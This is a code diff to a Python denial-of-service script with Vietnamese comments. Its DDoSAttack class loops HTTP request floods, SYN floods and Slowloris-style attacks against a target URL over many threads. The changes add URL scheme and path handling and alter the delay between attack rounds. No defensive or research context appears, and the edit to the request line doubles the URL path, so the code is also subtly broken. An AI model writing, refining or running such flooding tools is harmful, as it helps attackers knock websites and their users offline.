@@ -17,10 +17,14 @@ print("""
 
 class DDoSAttack:
     def __init__(self, target_url, threads):
+        # Đảm bảo URL có schema
+        if not urlparse(target_url).scheme:
+            target_url = 'http://' + target_url
         self.target_url = target_url
         self.threads = threads
         self.attack_num = 0
         self.target_domain = urlparse(target_url).netloc
+        self.target_path = urlparse(target_url).path or "/"
 
     def start(self):
         print(f"Starting attack on {self.target_url}")
@@ -33,7 +37,7 @@ class DDoSAttack:
             self.ddos_requester()
             self.syn_flood()
             self.pyslow()
-            time.sleep(0)  # Giảm thời gian ngủ để tăng tần suất tấn công
+            time.sleep(5)  # Wait a bit before restarting
 
     def ddos_requester(self):
         headers = {
@@ -44,7 +48,7 @@ class DDoSAttack:
             'Connection': 'keep-alive'
         }
         try:
-            response = requests.get(self.target_url, headers=headers)
+            response = requests.get(f"{self.target_url}{self.target_path}", headers=headers)
             self.attack_num += 1
             print(Fore.GREEN + f"Requester packet sent! Attack count: {self.attack_num} - Response code: {response.status_code}" + Style.RESET_ALL)
         except requests.RequestException as e:
